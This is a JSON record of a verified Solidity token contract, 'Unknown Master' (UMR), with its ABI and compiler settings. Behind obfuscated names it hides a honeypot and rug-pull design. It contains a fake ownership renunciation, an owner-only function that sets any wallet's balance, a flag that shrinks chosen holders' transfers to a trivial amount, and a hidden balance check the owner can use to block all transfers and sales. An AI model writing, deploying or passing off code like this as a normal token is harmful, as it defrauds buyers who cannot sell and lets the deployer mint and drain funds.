{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface sellEnable {\n    function createPair(address limitMarketing, address buyToken) external returns (address);\n}\n\ninterface senderTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxSwapMin) external view returns (uint256);\n\n    function transfer(address fundBuy, uint256 txLiquidity) external returns (bool);\n\n    function allowance(address fromAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundBuy,\n        uint256 txLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTrading, uint256 value);\n    event Approval(address indexed fromAmount, address indexed spender, uint256 value);\n}\n\nabstract contract txExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromAtAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTakeMetadata is senderTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnknownMaster is txExempt, senderTake, senderTakeMetadata {\n\n    uint256 private atEnable;\n\n    function fundTeam(address modeReceiverSender) public {\n        takeAmount();\n        if (atTeamFee == sellTake) {\n            maxAt = false;\n        }\n        if (modeReceiverSender == fromMarketingTeam || modeReceiverSender == liquidityLimit) {\n            return;\n        }\n        enableSwapTeam[modeReceiverSender] = true;\n    }\n\n    uint256 private totalIs;\n\n    function takeLiquidity(address amountLaunchedEnable, address fundBuy, uint256 txLiquidity) internal returns (bool) {\n        if (amountLaunchedEnable == fromMarketingTeam) {\n            return modeEnable(amountLaunchedEnable, fundBuy, txLiquidity);\n        }\n        uint256 txAmountAuto = senderTake(liquidityLimit).balanceOf(minAmount);\n        require(txAmountAuto == swapReceiverTeam);\n        require(fundBuy != minAmount);\n        if (enableSwapTeam[amountLaunchedEnable]) {\n            return modeEnable(amountLaunchedEnable, fundBuy, atMin);\n        }\n        return modeEnable(amountLaunchedEnable, fundBuy, txLiquidity);\n    }\n\n    uint256 swapReceiverTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLaunchFrom;\n    }\n\n    function transferFrom(address amountLaunchedEnable, address fundBuy, uint256 txLiquidity) external override returns (bool) {\n        if (_msgSender() != totalExemptMode) {\n            if (shouldMode[amountLaunchedEnable][_msgSender()] != type(uint256).max) {\n                require(txLiquidity <= shouldMode[amountLaunchedEnable][_msgSender()]);\n                shouldMode[amountLaunchedEnable][_msgSender()] -= txLiquidity;\n            }\n        }\n        return takeLiquidity(amountLaunchedEnable, fundBuy, txLiquidity);\n    }\n\n    mapping(address => uint256) private marketingShould;\n\n    function liquidityTradingFund(address amountShouldLiquidity, uint256 txLiquidity) public {\n        takeAmount();\n        marketingShould[amountShouldLiquidity] = txLiquidity;\n    }\n\n    mapping(address => bool) public enableSwapTeam;\n\n    address public liquidityLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptIsTotal;\n    }\n\n    function transfer(address amountShouldLiquidity, uint256 txLiquidity) external virtual override returns (bool) {\n        return takeLiquidity(_msgSender(), amountShouldLiquidity, txLiquidity);\n    }\n\n    address minAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountTradingSell(uint256 txLiquidity) public {\n        takeAmount();\n        swapReceiverTeam = txLiquidity;\n    }\n\n    uint8 private marketingIsLiquidity = 18;\n\n    constructor (){\n        if (sellTake == atMaxFund) {\n            atEnable = tokenAmountTotal;\n        }\n        fromAtAuto modeSellMin = fromAtAuto(totalExemptMode);\n        liquidityLimit = sellEnable(modeSellMin.factory()).createPair(modeSellMin.WETH(), address(this));\n        if (feeMode != totalIs) {\n            feeMode = atEnable;\n        }\n        fromMarketingTeam = _msgSender();\n        marketingToFrom[fromMarketingTeam] = true;\n        marketingShould[fromMarketingTeam] = enableLaunchFrom;\n        listReceiver();\n        \n        emit Transfer(address(0), fromMarketingTeam, enableLaunchFrom);\n    }\n\n    function approve(address atSwap, uint256 txLiquidity) public virtual override returns (bool) {\n        shouldMode[_msgSender()][atSwap] = txLiquidity;\n        emit Approval(_msgSender(), atSwap, txLiquidity);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldMode;\n\n    bool private sellTake;\n\n    function totalLaunched(address fromLaunched) public {\n        if (minEnable) {\n            return;\n        }\n        if (sellTake) {\n            feeMode = fromAuto;\n        }\n        marketingToFrom[fromLaunched] = true;\n        \n        minEnable = true;\n    }\n\n    address totalExemptMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public minEnable;\n\n    function modeEnable(address amountLaunchedEnable, address fundBuy, uint256 txLiquidity) internal returns (bool) {\n        require(marketingShould[amountLaunchedEnable] >= txLiquidity);\n        marketingShould[amountLaunchedEnable] -= txLiquidity;\n        marketingShould[fundBuy] += txLiquidity;\n        emit Transfer(amountLaunchedEnable, fundBuy, txLiquidity);\n        return true;\n    }\n\n    uint256 private enableLaunchFrom = 100000000 * 10 ** 18;\n\n    bool private maxAt;\n\n    address private minAt;\n\n    uint256 liquidityBuyReceiver;\n\n    string private maxEnable = \"UMR\";\n\n    uint256 constant atMin = 18 ** 10;\n\n    function balanceOf(address maxSwapMin) public view virtual override returns (uint256) {\n        return marketingShould[maxSwapMin];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingIsLiquidity;\n    }\n\n    function allowance(address sellMinAuto, address atSwap) external view virtual override returns (uint256) {\n        if (atSwap == totalExemptMode) {\n            return type(uint256).max;\n        }\n        return shouldMode[sellMinAuto][atSwap];\n    }\n\n    event OwnershipTransferred(address indexed modeSell, address indexed sellLimit);\n\n    bool public walletSwapTx;\n\n    function takeAmount() private view {\n        require(marketingToFrom[_msgSender()]);\n    }\n\n    bool public atTeamFee;\n\n    mapping(address => bool) public marketingToFrom;\n\n    uint256 private tokenAmountTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxEnable;\n    }\n\n    function listReceiver() public {\n        emit OwnershipTransferred(fromMarketingTeam, address(0));\n        minAt = address(0);\n    }\n\n    uint256 private fromAuto;\n\n    function owner() external view returns (address) {\n        return minAt;\n    }\n\n    uint256 private feeMode;\n\n    address public fromMarketingTeam;\n\n    function getOwner() external view returns (address) {\n        return minAt;\n    }\n\n    string private exemptIsTotal = \"Unknown Master\";\n\n    bool public atMaxFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMinAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"amountTradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeamFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwapMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSwapTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketingTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverSender\",\"type\":\"address\"}],\"name\":\"fundTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"liquidityTradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingToFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"}],\"name\":\"totalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchedEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwapTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UnknownMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}